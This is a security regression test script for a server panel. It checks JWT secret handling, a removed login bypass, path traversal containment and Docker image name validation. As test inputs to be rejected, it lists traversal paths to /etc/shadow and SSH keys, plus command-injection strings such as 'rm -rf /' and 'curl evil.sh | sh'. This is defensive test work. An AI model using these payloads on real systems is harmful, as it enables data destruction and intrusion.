/**
 * Security regression tests for the fixes made after the deployment audit.
 *
 * Run with:  npx tsx works/tests/security/security.mjs
 *
 * These are cheap, hermetic checks (no Docker, no network) that lock in the
 * behaviour of the auth, path-resolution and input-validation fixes. They
 * complement works/tests/multinode, which exercises real Wings + Docker.
 */
import fs from "fs-extra";
import path from "path";
import os from "os";

let passed = 0;
let failed = 0;

const check = (name, condition, detail = "") => {
  if (condition) {
    passed++;
    console.log(`  PASS  ${name}`);
  } else {
    failed++;
    console.log(`  FAIL  ${name}${detail ? ` -- ${detail}` : ""}`);
  }
};

const section = (title) => console.log(`\n== ${title} ==`);

// The panel resolves paths relative to process.cwd(), so run against a scratch dir.
const sandbox = await fs.mkdtemp(path.join(os.tmpdir(), "jtg-security-"));
process.chdir(sandbox);
process.env.JWT_SECRET = "a".repeat(64);
await fs.ensureDir(".data");
await fs.writeJson(".data/users.json", []);
await fs.writeJson(".data/servers.json", []);

const ROOT = process.env.JTG_REPO_ROOT || "/home/glox/jtgsecret";

// ---------------------------------------------------------------- JWT secret
section("JWT secret fails closed in production");

const jwtModule = await import(path.join(ROOT, "src/server/services/jwtSecret.ts"));
const { getJwtSecret } = jwtModule;

{
  const savedEnv = process.env.NODE_ENV;
  const savedSecret = process.env.JWT_SECRET;

  process.env.NODE_ENV = "production";
  delete process.env.JWT_SECRET;
  let threw = "";
  try {
    getJwtSecret();
  } catch (e) {
    threw = e.message;
  }
  check("production without JWT_SECRET refuses to sign", threw.includes("not set"), threw);

  process.env.JWT_SECRET = "jtg-panel-super-secret";
  threw = "";
  try {
    getJwtSecret();
  } catch (e) {
    threw = e.message;
  }
  check("published default secret is rejected", threw.includes("default"), threw);

  process.env.JWT_SECRET = "tooshort";
  threw = "";
  try {
    getJwtSecret();
  } catch (e) {
    threw = e.message;
  }
  check("short secret is rejected in production", threw.includes("too short"), threw);

  process.env.JWT_SECRET = "a".repeat(64);
  check("strong secret is accepted", getJwtSecret() === "a".repeat(64));

  process.env.NODE_ENV = savedEnv;
  process.env.JWT_SECRET = savedSecret;
}

// ------------------------------------------------------------- Auth bypass
section("Login cannot self-provision accounts");

{
  const express = (await import("express")).default;
  const { login } = await import(path.join(ROOT, "src/server/controllers/auth.ts"));

  const app = express();
  app.use(express.json());
  app.post("/login", login);
  const httpServer = app.listen(0);
  const port = httpServer.address().port;

  const savedEnv = process.env.NODE_ENV;
  const savedBypass = process.env.DEV_AUTH_BYPASS;
  // The old bypass triggered on NODE_ENV !== production OR PORT === 3000.
  for (const env of [
    { NODE_ENV: "production", PORT: undefined, DEV_AUTH_BYPASS: undefined },
    { NODE_ENV: "development", PORT: undefined, DEV_AUTH_BYPASS: undefined },
    { NODE_ENV: "production", PORT: "3000", DEV_AUTH_BYPASS: undefined },
  ]) {
    await fs.writeJson(".data/users.json", []);
    process.env.NODE_ENV = env.NODE_ENV;
    process.env.DEV_AUTH_BYPASS = env.DEV_AUTH_BYPASS;
    if (env.PORT) process.env.PORT = env.PORT;
    else delete process.env.PORT;

    const res = await fetch(`http://127.0.0.1:${port}/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ username: "attacker", password: "anything" }),
    });
    const users = await fs.readJson(".data/users.json");
    check(
      `unknown login rejected and creates no account (NODE_ENV=${env.NODE_ENV}, PORT=${env.PORT || "-"})`,
      res.status === 401 && users.length === 0,
      `status=${res.status} users=${users.length}`
    );
  }

  delete process.env.PORT;
  process.env.NODE_ENV = savedEnv;
  if (savedBypass === undefined) delete process.env.DEV_AUTH_BYPASS;
  else process.env.DEV_AUTH_BYPASS = savedBypass;
  httpServer.close();
}

// ------------------------------------------------------------ Path handling
section("Path traversal is contained");

{
  const { resolveWithin, getServerDir, isInside } = await import(
    path.join(ROOT, "src/server/utils/safePath.ts")
  );
  const base = "/srv/.data/servers/abc";

  const blocked = [
    "../other",
    "../../etc/passwd",
    "..",
    "sub/../../other",
    "a/../../b",
    "/etc/passwd",
    "/srv/.data/servers/abc/../../../../root/.ssh/id_rsa",
    "a\0b",
    "/a/b/../../../../../../etc/shadow",
  ];
  for (const input of blocked) {
    check(`blocks ${JSON.stringify(input)}`, resolveWithin(base, input) === null);
  }

  const allowed = ["ok.txt", "sub/ok.txt", "a/b/../c", "...", "..foo", "", undefined];
  for (const input of allowed) {
    check(
      `allows ${JSON.stringify(input)}`,
      resolveWithin(base, input) !== null,
      String(resolveWithin(base, input))
    );
  }

  check(
    "sibling directory with shared prefix is not 'inside'",
    !isInside("/srv/.data/servers/abc", "/srv/.data/servers/abcdef/secret.txt")
  );

  for (const badId of ["..", "../x", "abc/def", "", "a".repeat(65), "a/b", 123, null]) {
    check(`rejects server id ${JSON.stringify(badId)}`, getServerDir(badId) === null);
  }
  check("accepts a normal server id", getServerDir("srv-123_abc") !== null);
}

// ------------------------------------------------------- Docker image input
section("Docker image references are validated before exec");

{
  const { isSafeImageReference } = await import(path.join(ROOT, "src/server/services/docker.ts"));
  for (const good of ["nginx", "nginx:1.25", "ghcr.io/org/name:tag", "library/nginx:latest"]) {
    check(`allows image ${good}`, isSafeImageReference(good) === true);
  }
  const bad = [
    "nginx; rm -rf /",
    "nginx && curl evil.sh | sh",
    "$(id)",
    "`id`",
    "nginx\nnginx",
    "nginx 'quote'",
    "a".repeat(300),
    "",
    null,
    123,
  ];
  for (const input of bad) {
    check(`rejects image ${JSON.stringify(input)}`, isSafeImageReference(input) === false);
  }
}

await fs.remove(sandbox);

console.log(`\nTotals: PASS=${passed} FAIL=${failed}`);
process.exit(failed === 0 ? 0 : 1);
